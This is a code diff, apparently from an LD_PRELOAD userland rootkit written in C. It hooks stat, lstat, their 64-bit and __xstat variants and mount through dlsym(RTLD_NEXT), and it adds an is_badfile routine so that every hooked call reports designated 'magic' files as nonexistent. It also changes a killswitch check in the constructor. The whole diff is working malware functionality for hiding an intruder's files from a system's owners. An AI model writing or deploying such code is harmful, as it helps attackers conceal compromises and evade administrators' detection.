@@ -24,8 +24,11 @@ init(void)
     printf("[-] constructor\n");
     #endif
     #ifdef KILLSWITCH
+    if(!hooked_xstat){
+        hooked_xstat = load_libc("__xstat");
+    }
     struct stat buffer;
-    if (stat(KILLSWITCH, &buffer) == 0){
+    if (hooked_xstat(_STAT_VER, KILLSWITCH, &buffer) == 0){
         #ifdef DEBUG
         printf("[!] killswitch found!\n");
         #endif
@@ -387,39 +390,24 @@ int mount(const char *source, const char *target,
     return hooked_mount(source, target, filesystemtype, mountflags, data);
 }
 
-/*
-int lstat(const char *pathname, struct stat *buf){
-    printf("[+] Hooked LSTAT :: %s \n", pathname);
-    if (!hooked_xlstat){
-        hooked_xlstat = load_libc("__xlstat");
-    }
+int is_badfile(const char *pathname){
     char realpathname[PATH_MAX];
     realpath(pathname, realpathname);
     if (is_magicfile(realpathname)){
-        printf("BAAAD FILE! .smirk\n");
+        #ifdef DEBUG
+        printf("[+] Magicfile found, returning NOENT: %s\n", realpathname);
+        #endif
         errno = ENOENT;
         return -1;
     }
-    printf("GOOD FILE!  .smirk\n");
-    return hooked_xlstat(pathname, buf);
+    return 0;
 }
-
-int stat(const char *pathname, struct stat *buf){
-    printf("[+] Hooked STAT \n");
-    char realpathname[PATH_MAX];
-    realpath(pathname, realpathname);
-    return lstat(realpathname, buf);
-}
-*/
 
 int stat(const char *path, struct stat *buf)
 {
     #ifdef DEBUG
     printf("[-] hooking stat %s\n", path);
     #endif
-    if ( hooked_stat == NULL ) {
-        hooked_stat = dlsym(RTLD_NEXT, "stat");
-    }
 
     return __xstat(_STAT_VER, path, buf);
 } 
@@ -433,6 +421,9 @@ int __xstat(int version, const char *path, struct stat *buf)
         hooked_xstat = dlsym(RTLD_NEXT, "__xstat");
     }
 
+    if (is_badfile(path)){
+        return -1;
+    }
     return hooked_xstat(version, path, buf);
 } 
 
@@ -441,9 +432,6 @@ int stat64(const char *path, struct stat64 *buf)
     #ifdef DEBUG
     printf("[-] hooking stat64 %s\n", path);
     #endif
-    if ( hooked_stat == NULL ) {
-        hooked_stat = dlsym(RTLD_NEXT, "stat64");
-    }
 
     return __xstat64(_STAT_VER, path, buf);
 } 
@@ -457,6 +445,9 @@ int __xstat64(int version, const char *path, struct stat64 *buf)
         hooked_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
     }
 
+    if (is_badfile(path)){
+        return -1;
+    }
     return hooked_xstat64(version, path, buf);
 } 
 
@@ -465,9 +456,6 @@ int lstat(const char *path, struct stat *buf)
     #ifdef DEBUG
     printf("[-] hooking lstat %s\n", path);
     #endif
-    if ( hooked_stat == NULL ) {
-        hooked_stat = dlsym(RTLD_NEXT, "lstat");
-    }
 
     return __lxstat(_STAT_VER, path, buf);
 } 
@@ -481,6 +469,9 @@ int __lxstat(int version, const char *path, struct stat *buf)
         hooked_lxstat = dlsym(RTLD_NEXT, "__lxstat");
     }
 
+    if (is_badfile(path)){
+        return -1;
+    }
     return hooked_lxstat(version, path, buf);
 } 
 
@@ -489,9 +480,6 @@ int lstat64(const char *path, struct stat64 *buf)
     #ifdef DEBUG
     printf("[-] hooking lstat64 %s\n", path);
     #endif
-    if ( hooked_lstat64 == NULL ) {
-        hooked_lstat64 = dlsym(RTLD_NEXT, "lstat64");
-    }
 
     return __lxstat64(_STAT_VER, path, buf);
 } 
@@ -505,5 +493,8 @@ int __lxstat64(int version, const char *path, struct stat64 *buf)
         hooked_lxstat64 = dlsym(RTLD_NEXT, "__lxstat64");
     }
 
+    if (is_badfile(path)){
+        return -1;
+    }
     return hooked_lxstat64(version, path, buf);
 } 
